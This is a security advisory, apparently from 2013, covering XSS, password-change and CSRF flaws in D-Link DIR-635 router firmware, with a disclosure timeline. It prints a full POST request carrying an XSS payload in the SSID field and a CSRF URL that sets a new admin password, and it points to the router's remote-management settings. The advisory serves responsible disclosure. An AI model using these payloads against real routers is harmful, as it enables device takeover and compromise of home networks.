@@ -1,0 +1,68 @@
+Device Name: DIR-635
+Vendor: D-Link
+
+============  Vulnerable Firmware Releases: ============ 
+
+Firmwareversion: 2.34EU
+Hardware-Version: B1
+Produktseite: DIR-635
+
+============ Vulnerability Overview: ============ 
+
+* Stored XSS -> Status - WLAN -> SSID
+
+Injecting scripts into the parameter config.wireless%5B0%5D.ssid_profiles%5B0%5D.ssid reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.
+
+Place the Code via Setup -> Wireless -> Wireless Network Name
+
+POST /Basic/Wireless.shtml HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.0.1/Basic/Wireless.shtml
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2307
+
+config.wireless%5B0%5D.radio_control=1&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wlan_schedule_name=Always&config.wireless%5B0%5D.ssid_profiles%5B0%5D.ssid=%22%3E%3Cimg+src%3D%220%22+onerror%3Dalert%282%29%3E&config.wireless%5B0%5D.erp_protection=true&config.wireless%5B0%5D.phy_mode=11&config.wireless%5B0%5D.auto_channel=true&config.wireless%5B0%5D.channel=6&config.wireless%5B0%5D.tx_rate=0&config.wireless%5B0%5D.cwm_mode=0&config.wireless%5B0%5D.num_streams=65535&config.wireless%5B0%5D.ssid_profiles%5B0%5D.invisibility=0&wireless_invisibility_radio_0=0&config.wireless%5B0%5D.ssid_profiles%5B0%5D.qos=0&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wepon=false&config.wireless%5B0%5D.ssid_profiles%5B0%5D.ieee8021x_enabled=false&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wpa_enabled=true&config.wireless%5B0%5D.ssid_profiles%5B0%5D.keylen=1&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wep_key_type=0&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wep_key%5B0%5D=12345678902551234567890255&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wep_key%5B1%5D=12345678902551234567890255&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wep_key%5B2%5D=12345678902551234567890255&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wep_key%5B3%5D=12345678902551234567890255&config.wireless%5B0%5D.ssid_profiles%5B0%5D.use_key=0&config.wireless%5B0%5D.ssid_profiles%5B0%5D.auth=1&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wpa_mode=2&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wpa_cipher=3&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wpa_rekey_time=3600&config.wireless%5B0%5D.ssid_profiles%5B0%5D.wpa_psk=%22%3E%3Cimg+src%3D%220%22+onerror%3Dalert%281%29%3E&config.wireless%5B0%5D.ssid_profiles%5B0%5D.ieee8021x_reauth_time=60&config.wireless%5B0%5D.ssid_profiles%5B0%5D.radius_server_address=0.0.0.0&config.wireless%5B0%5D.ssid_profiles%5B0%5D.radius_server_port=1812&config.wireless%5B0%5D.ssid_profiles%5B0%5D.radius_shared_secret=radius_shared&config.wireless%5B0%5D.ssid_profiles%5B0%5D.radius_auth_mac=true&config.wireless%5B0%5D.ssid_profiles%5B0%5D.second_radius_server_address=0.0.0.0&config.wireless%5B0%5D.ssid_profiles%5B0%5D.second_radius_server_port=1812&config.wireless%5B0%5D.ssid_profiles%5B0%5D.second_radius_shared_secret=radius_shared&config.wireless%5B0%5D.ssid_profiles%5B0%5D.second_radius_auth_mac=true
+
+The code gets executed via Status -> Device Information:
+http://Target-IP/Status/Device_Info.shtml
+
+* reflected XSS via Extras -> system Check -> Ping
+
+Injecting scripts into the parameter data reveals that this parameter is not properly validated for malicious input.
+
+* For changing the current password there is no request to the current password
+
+With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.
+
+* CSRF for changing the password without knowing the current one and the attacker is able to activate the remote management:
+
+http://Target-IP/Tools/Admin.shtml?config.password=admin1&config.user_password=&config.gw_name=D-Link+Systems+DIR-635&config.web_server_idle_timeout=5&config.graph_auth=false&config.web_server_allow_https=false&config.web_server_allow_wan_http=false&config.web_server_allow_wan_https=false&config.web_server_wan_port_http=8080&config.web_server_wan_port_https=8181&config.wan_web_ingress_filter_name=Allow+All&wan_ingress_filter_details=Allow+All
+
+============ Solution ============
+
+No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de/advisories
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+November 2012 - discovered vulnerability
+11.11.2012 - contacted dlink via the webinterface
+20.12.2012 - contacted Heise Security with details and Heisec forwarded the details to D-Link
+21.12.2012 - D-link responded that they will check the findings
+11.01.2013 - requested status update
+25.01.2013 - requested status update
+25.01.2013 - D-Link responded that this is a security problem from the user and/or browser and they will not provide a fix
+25.04.2013 - public release
+
+===================== Advisory end =====================
